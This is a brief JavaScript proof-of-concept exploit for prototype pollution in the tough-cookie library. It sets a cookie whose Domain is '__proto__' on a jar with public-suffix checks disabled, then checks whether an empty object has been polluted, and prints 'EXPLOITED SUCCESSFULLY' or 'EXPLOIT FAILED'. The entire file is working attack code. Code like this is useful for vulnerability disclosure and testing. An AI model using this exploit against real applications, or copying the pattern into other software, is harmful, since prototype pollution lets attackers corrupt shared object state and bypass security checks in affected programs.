async function main() {
  try {
    const tough = require("tough-cookie");
    const jar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });

    jar.setCookieSync(
      "Slonser=polluted; Domain=__proto__; Path=/notauth",
      "https://__proto__/admin"
    );
    jar.setCookieSync(
      "Auth=Lol; Domain=google.com; Path=/notauth",
      "https://google.com/"
    );
    const pollutedObject = {};
    if (pollutedObject["/notauth"] === undefined) {
      throw new Error("EXPLOIT FAILED");
    }
    console.log("Polluted object:", pollutedObject["/notauth"], "EXPLOITED SUCCESSFULLY");

  } catch (error) {
    console.error("EXPLOIT FAILED");
  }
}

main();
